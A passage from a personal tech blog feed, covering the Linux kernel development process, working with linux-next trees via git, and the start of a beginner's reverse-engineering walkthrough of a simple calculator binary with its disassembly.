</span></span><span class="line"><span class="cl"><span class="n">way</span> <span class="n">to</span> <span class="n">write</span> <span class="n">a</span> <span class="n">character</span> <span class="n">driver</span><span class="err">?</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Just</span> <span class="n">when</span> <span class="n">you</span> <span class="n">think</span> <span class="n">this</span> <span class="n">challenge</span> <span class="n">is</span> <span class="n">all</span> <span class="n">about</span> <span class="n">writing</span> <span class="n">kernel</span> <span class="n">code</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="n">this</span> <span class="n">task</span> <span class="n">is</span> <span class="n">a</span> <span class="n">throwback</span> <span class="n">to</span> <span class="n">your</span> <span class="n">second</span> <span class="n">one</span><span class="o">.</span>  <span class="n">Yes</span><span class="p">,</span> <span class="n">that</span><span class="s1">&#39;s right,</span>
</span></span><span class="line"><span class="cl"><span class="n">building</span> <span class="n">kernels</span><span class="o">.</span>  <span class="n">Turns</span> <span class="n">out</span> <span class="n">that</span><span class="s1">&#39;s what most developers end up doing,</span>
</span></span><span class="line"><span class="cl"><span class="n">tons</span> <span class="ow">and</span> <span class="n">tons</span> <span class="n">of</span> <span class="n">rebuilds</span><span class="p">,</span> <span class="ow">not</span> <span class="n">writing</span> <span class="n">new</span> <span class="n">code</span><span class="o">.</span>  <span class="n">Sad</span><span class="p">,</span> <span class="n">but</span> <span class="n">it</span> <span class="n">is</span> <span class="n">a</span> <span class="n">good</span>
</span></span><span class="line"><span class="cl"><span class="n">skill</span> <span class="n">to</span> <span class="n">know</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">tasks</span> <span class="n">this</span> <span class="nb">round</span> <span class="n">are</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="n">Download</span> <span class="n">the</span> <span class="n">linux</span><span class="o">-</span><span class="n">next</span> <span class="n">kernel</span> <span class="k">for</span> <span class="n">today</span><span class="o">.</span>  <span class="n">Or</span> <span class="n">tomorrow</span><span class="p">,</span> <span class="n">just</span> <span class="n">use</span>
</span></span><span class="line"><span class="cl">    <span class="n">the</span> <span class="n">latest</span> <span class="n">one</span><span class="o">.</span>  <span class="n">It</span> <span class="n">changes</span> <span class="n">every</span> <span class="n">day</span> <span class="n">so</span> <span class="n">there</span> <span class="n">is</span> <span class="n">no</span> <span class="n">specific</span> <span class="n">one</span>
</span></span><span class="line"><span class="cl">    <span class="n">you</span> <span class="n">need</span> <span class="n">to</span> <span class="n">pick</span><span class="o">.</span>  <span class="n">Build</span> <span class="n">it</span><span class="o">.</span>  <span class="n">Boot</span> <span class="n">it</span><span class="o">.</span>  <span class="n">Provide</span> <span class="n">proof</span> <span class="n">that</span> <span class="n">you</span> <span class="n">built</span>
</span></span><span class="line"><span class="cl">    <span class="ow">and</span> <span class="n">booted</span> <span class="n">it</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">What</span> <span class="n">is</span> <span class="n">the</span> <span class="n">linux</span><span class="o">-</span><span class="n">next</span> <span class="n">kernel</span><span class="err">?</span>  <span class="n">Ah</span><span class="p">,</span> <span class="n">that</span><span class="s1">&#39;s part of the challenge.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">For</span> <span class="n">a</span> <span class="n">hint</span><span class="p">,</span> <span class="n">you</span> <span class="n">should</span> <span class="n">read</span> <span class="n">the</span> <span class="n">excellent</span> <span class="n">documentation</span> <span class="n">about</span> <span class="n">how</span> <span class="n">the</span>
</span></span><span class="line"><span class="cl"><span class="n">Linux</span> <span class="n">kernel</span> <span class="n">is</span> <span class="n">developed</span> <span class="ow">in</span> <span class="n">Documentation</span><span class="o">/</span><span class="n">development</span><span class="o">-</span><span class="n">process</span><span class="o">/</span> <span class="ow">in</span> <span class="n">the</span>
</span></span><span class="line"><span class="cl"><span class="n">kernel</span> <span class="n">source</span> <span class="n">itself</span><span class="o">.</span>  <span class="n">It</span><span class="s1">&#39;s a great read, and should tell you all you</span>
</span></span><span class="line"><span class="cl"><span class="n">never</span> <span class="n">wanted</span> <span class="n">to</span> <span class="n">know</span> <span class="n">about</span> <span class="n">what</span> <span class="n">Linux</span> <span class="n">kernel</span> <span class="n">developers</span> <span class="k">do</span> <span class="ow">and</span> <span class="n">how</span> <span class="n">they</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="n">it</span><span class="o">.</span>
</span></span></code></pre></div><h1 id="what-is-linux">What is Linux??</h1>
<p>Before jumping on Linux-next&hellip;let&rsquo;s start with an overview of the Linux kernel and its significance within the Linux operating system.</p>
<p>Linux is an open-source operating system kernel that was initially developed by Linus Torvalds in 1991. The kernel serves as the core component of the Linux operating system, providing essential functionalities and acting as an intermediary between the hardware and the software layers.</p>
<p>The Linux kernel plays a crucial role in managing system resources, handling hardware devices, and providing a foundation for software applications to run efficiently. Some of its key responsibilities include process management, memory management, device driver handling, file system management, and networking.</p>
<p>One of the defining characteristics of Linux is its open-source nature. This means that the source code of the kernel is freely available to the public, allowing individuals and communities to examine, modify, and distribute it according to their needs. This openness has fostered a vibrant ecosystem of developers who collaborate to improve and enhance the kernel&rsquo;s capabilities.</p>
<p>Linux is renowned for its stability, security, and scalability. Its robust design and efficient resource management make it suitable for a wide range of computing devices, from small embedded systems and smartphones to large-scale servers and supercomputers. Moreover, Linux serves as the foundation for numerous Linux distributions, which are complete operating systems that package the Linux kernel with additional software and user-friendly interfaces.</p>
<p>By harnessing the power of open-source collaboration, Linux has grown into a highly versatile and widely adopted operating system, powering various domains such as enterprise computing, cloud infrastructure, scientific research, mobile devices, and more. Its flexibility, reliability, and vast community support make it an attractive choice for individuals, businesses, and organizations seeking a powerful and customizable operating system.</p>
<p>Now that we have a basic understanding of Linux and its kernel, we can delve into the concept of Linux-next and its significance within the development process.</p>
<h2 id="big-picture-of-linux-development">Big picture of linux development</h2>
<p>The development of the Linux kernel in the open-source world is a remarkable (somewhat scary for me) and dynamic process that involves collaboration among thousands of developers worldwide. Here&rsquo;s a big picture overview of the Linux kernel development process:</p>
<ol>
<li>
<p><strong>Collaboration and Community</strong>: The Linux kernel development thrives on collaboration and community engagement. It is led by Linus Torvalds, the original creator of Linux, along with a core group of maintainers who oversee different subsystems of the kernel. The development process follows a meritocratic model where contributions are reviewed and integrated based on their technical merits.</p>
</li>
<li>
<p><strong>Patch Submission</strong>: Developers from diverse backgrounds and organizations contribute to the Linux kernel. They propose changes, enhancements, bug fixes, and new features in the form of patches. These patches are submitted to the relevant subsystem maintainers or mailing lists for review.</p>
</li>
<li>
<p><strong>Review and Feedback</strong>: The submitted patches undergo a thorough review process, where experienced developers provide feedback, suggestions, and technical guidance. The review process ensures that the proposed changes align with the kernel&rsquo;s standards, maintain compatibility, and adhere to best practices.</p>
</li>
<li>
<p><strong>Iterative Development</strong>: Developers iterate on their patches based on the feedback received during the review process. They make necessary modifications, address concerns, and refine their code to meet the kernel&rsquo;s quality standards.</p>
</li>
<li>
<p><strong>Testing and Integration</strong>: Once the patches are considered ready, they are tested extensively. Various testing frameworks, such as the Linux Test Project (LTP) and KernelCI, are used to ensure that the changes do not introduce regressions and maintain stability. The patches are then integrated into the &ldquo;mainline&rdquo; development branch.</p>
</li>
<li>
<p><strong>Mainline Integration</strong>: The mainline development branch is where the accepted patches are merged into the official Linux kernel source code. Linus Torvalds oversees this process and has the final authority to accept or reject patches based on technical considerations. The mainline branch represents the most up-to-date version of the Linux kernel and serves as the basis for future releases.</p>
</li>
<li>
<p><strong>Stable Releases and Long-Term Support</strong>: The Linux kernel follows a time-based release model, with new stable versions being released approximately every two to three months. These releases incorporate the accumulated changes from the mainline branch, undergo further testing, and receive bug fixes. Additionally, long-term support (LTS) versions are maintained for an extended period to ensure stability and compatibility for enterprise and embedded systems.</p>
</li>
<li>
<p><strong>Ecosystem and Distribution</strong>: The Linux kernel forms the foundation for numerous Linux distributions. These distributions package the kernel with additional software, libraries, and user interfaces to create complete operating systems suitable for various use cases. The distributions play a crucial role in making Linux accessible to a wide range of users, providing installation, customization, and support options.</p>
</li>
</ol>
<p>The Linux kernel development follows a patch cycle that involves several release candidate (RC) versions before a stable release is made. Here&rsquo;s an overview of the Linux patch cycle and RC versions:</p>
<ol>
<li>
<p><strong>Development Cycle</strong>: The development cycle begins after a stable release is made. During this cycle, new features, enhancements, bug fixes, and improvements are introduced into the Linux kernel.</p>
</li>
<li>
<p><strong>Patch Submission</strong>: Developers submit patches for review and inclusion in the next kernel release. These patches can come from individual contributors, companies, or organizations.</p>
</li>
<li>
<p><strong>Mainline Integration</strong>: The submitted patches go through a review process, where they are examined for technical correctness, adherence to coding standards, and compatibility with existing code. Accepted patches are integrated into the mainline development branch of the Linux kernel.</p>
</li>
<li>
<p><strong>Merge Window</strong>: The merge window is a specific period at the beginning of the development cycle when major changes and new features are merged into the mainline development branch. During this time, the Linux kernel developers are more open to accepting substantial modifications.</p>
</li>
<li>
<p><strong>Release Candidates (RC)</strong>: After the merge window closes, the Linux kernel development enters the release candidate phase. Release candidates are pre-release versions of the kernel that undergo testing and further refinement before the final stable release. Each release candidate is identified by the tag <code>-rc&lt;number&gt;</code>.</p>
<ul>
<li>RC1: The first release candidate marks the beginning of the testing phase for the upcoming release. It includes the merged changes from the merge window.</li>
<li>RC2, RC3, and so on: Successive release candidates incorporate additional bug fixes, improvements, and patches that are considered stable enough to be tested.</li>
</ul>
</li>
<li>
<p><strong>Testing and Bug Fixing</strong>: During the release candidate phase, extensive testing is performed by developers, testers, and the wider community. Any bugs, regressions, or issues discovered during this testing period are addressed and fixed in subsequent release candidates.</p>
</li>
<li>
<p><strong>Stable Release</strong>: Once the release candidates have undergone sufficient testing and the kernel is deemed stable, the final stable release is made. The stable release incorporates all the accepted changes and bug fixes from the release candidates.</p>
</li>
<li>
<p><strong>Long-Term Support (LTS) Releases</strong>: In addition to the regular stable releases, certain versions of the Linux kernel are designated as Long-Term Support (LTS) releases. These LTS versions receive extended maintenance and bug fix support for a specified period to ensure stability and compatibility for enterprise and embedded systems.</p>
</li>
</ol>
<p>Here is how the 5.4 development cycle went:</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Release</th>
</tr>
</thead>
<tbody>
<tr>
<td>September 15, 2019</td>
<td>5.3 stable release</td>
</tr>
<tr>
<td>September 30, 2019</td>
<td>5.4-rc1, merge window closes</td>
</tr>
<tr>
<td>October 6, 2019</td>
<td>5.4-rc2</td>
</tr>
<tr>
<td>October 13, 2019</td>
<td>5.4-rc3</td>
</tr>
<tr>
<td>October 20, 2019</td>
<td>5.4-rc4</td>
</tr>
<tr>
<td>October 27, 2019</td>
<td>5.4-rc5</td>
</tr>
<tr>
<td>November 3, 2019</td>
<td>5.4-rc6</td>
</tr>
<tr>
<td>November 10, 2019</td>
<td>5.4-rc7</td>
</tr>
<tr>
<td>November 17, 2019</td>
<td>5.4-rc8</td>
</tr>
<tr>
<td>November 24, 2019</td>
<td>5.4 stable release</td>
</tr>
</tbody>
</table>
<p><em>Table taken from kernel.org/doc</em></p>
<h2 id="next-trees">Next trees</h2>
<p>&ldquo;Linux Next&rdquo; refers to a specific development branch of the Linux kernel. The Linux Next branch serves as a staging area for upcoming changes and new features that are planned for inclusion in future versions of the Linux kernel. It acts as a testing ground where patches from different developers and subsystems are integrated and tested together.</p>
<p>The purpose of the Linux Next branch is to catch any potential conflicts or issues that may arise when combining different changes before they are merged into the mainline Linux kernel. By testing these changes in advance, it helps ensure the overall stability and quality of the Linux kernel.</p>
<p>The Linux Next branch is maintained by the Linux Next project, which is led by Stephen Rothwell and is supported by several Linux kernel developers. It provides a convenient way for developers to collaborate, test, and integrate their changes before they are submitted for inclusion in the mainline kernel.</p>
<p>There is a great <a href="https://www.youtube.com/watch?v=vyenmLqJQjs">Youtube video</a> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> where Greg Kroah-Hartman explains the whole development workflow. <strong>A MUST WATCH!!</strong></p>
<h1 id="working-with-linux-next">Working with linux-next</h1>
<p>Now that we understand how the Linux development process works, we can see where the <code>-next</code> trees fall into the overall process. Let&rsquo;s look at how these trees can be used to contribute to kernel development.</p>
<h2 id="initial-setup">Initial setup</h2>
<ul>
<li>Clone the linux tree</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git
</span></span></code></pre></div><ul>
<li>Add a <code>linux-next</code> remote.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd linux
</span></span><span class="line"><span class="cl">git remote add linux-next https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git
</span></span></code></pre></div><ul>
<li>Fetch the changes and tags from <code>linux-next</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git fetch linux-next
</span></span><span class="line"><span class="cl">git fetch --tags linux-next
</span></span></code></pre></div><h2 id="regular-tracking">Regular tracking</h2>
<p>Linux <code>-next</code> trees are built every day&hellip; so you need to update it everyday before your work to make sure that you are not working on an older code base.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git checkout master
</span></span><span class="line"><span class="cl">git remote update
</span></span></code></pre></div><ul>
<li>Check newer tags</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git tag -l &#34;next-*&#34; | tail
</span></span></code></pre></div><ul>
<li>Checkout a new branch from the branch you want to work</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git checkout -b my_local_branch next-20230427
</span></span></code></pre></div><p>Now the next steps are very simple and straight-forward.</p>
<ul>
<li>Make changes to the code base.</li>
<li>Test it with <code>./scripts/checkpatch.pl</code> script for any issues which you need to solve before submitting it as a patch.</li>
<li>Check <code>git status</code> and <code>git diff</code> before making a commit.</li>
<li>Make a patch using <code>git format-patch</code> command.</li>
<li>Now you have a well tested and formatted patch, all you need to do is find the maintainer using <code>./scripts/get_maintainer.pl</code> script and then send the patch to all those people using <code>git send-mail</code>.</li>
</ul>
<p><em><strong>Note:</strong> All of the above-discussed tools and techniques are completely optional; this is just what I would do.</em></p>
<h1 id="resources">Resources</h1>
<ul>
<li><a href="http://vger.kernel.org/vger-lists.html">Linux development subscription lists (mails)</a></li>
<li><a href="https://git.kernel.org/">All linux trees (git)</a></li>
<li><a href="https://www.kernel.org/doc/man-pages/linux-next.html">Linux-next man page</a></li>
<li><a href="https://www.kernel.org/doc/html/latest/process/2.Process.html">Linux kernel development process (official doc)</a></li>
<li><a href="https://www.youtube.com/watch?v=vyenmLqJQjs">Youtube: Linux Kernel Development, Greg Kroah-Hartman - Git Merge 2016</a></li>
</ul>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://www.youtube.com/watch?v=vyenmLqJQjs">https://www.youtube.com/watch?v=vyenmLqJQjs</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Intro to RE: C : A Simple Calculator</title>
      <link>https://ayedaemon.github.io/post/2023/04/intro-to-re-simple-calculator/</link>
      <pubDate>Mon, 03 Apr 2023 21:59:48 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2023/04/intro-to-re-simple-calculator/</guid>
      <description>How to reverse engineer a simple calculator program from scratch</description>
      <content:encoded><![CDATA[<p>We covered a wide range of topics in earlier articles that were helpful in comprehending how many lower-level processes operate. This blog will concentrate on applying those ideas to recreate C program after reverse engineering a simple calculator binary.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/Pmv6m86yGQCjkLjmqx/giphy.gif#center" alt=""  />
</p>
<p>It is always a good idea to observe how the target software responds to various inputs. This gives you a sense of the internal logic that might be operating.</p>
<p>If we run this program without any arguments, we will get an error message stating that we need to pass more arguments as well as the usage guide is printed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ./calc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Not enough arguments passed
</span></span><span class="line"><span class="cl">Usage: ./calc &lt;num1&gt; &lt;operator&gt; &lt;num2&gt;
</span></span></code></pre></div><p>So I can assume that there are checks in place which will see if we&rsquo;ve passed enough arguments. If not, it&rsquo;ll exit with the above message.</p>
<p>So its obvious for anybody now to try it with the arguments this time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ./calc 5 + 3
</span></span><span class="line"><span class="cl">5 + 3 = 8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ ./calc 100 / 5
</span></span><span class="line"><span class="cl">100 / 5 = 20
</span></span></code></pre></div><p>This works now and gives us the required output in a good looking way. That should do it for now.</p>
<p>It&rsquo;s time to open up our hacker tools and disassemble the binary.</p>
<p>Disassembly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">addFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nl">subFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nl">mulFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">imul</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nl">divFunc:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="no">esi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cdq</span>
</span></span><span class="line"><span class="cl">        <span class="nf">idiv</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;Not enough arguments passed&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LC1:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;Usage: ./calc &lt;num1&gt; &lt;operator&gt; &lt;num2&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">die:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">puts</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">OFFSET</span> <span class="no">FLAT</span><span class="p">:.</span><span class="no">LC1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">puts</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">exit</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LC2:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;%d %c %d = %d\n&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">48</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-36</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">],</span> <span class="no">rsi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-36</span><span class="p">],</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L11</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">die</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L11:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">atoi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">atoi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">rax</span><span class="p">,</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movzx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">],</span> <span class="no">al</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movsx</span>   <span class="no">eax</span><span class="p">,</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-17</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">47</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L12</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">47</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">45</span>
</span></span><span class="line"><span class="cl">        <span class="nf">je</span>      <span class="no">.L14</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">45</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jg</span>      <span class="no">.L13</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">42</span>
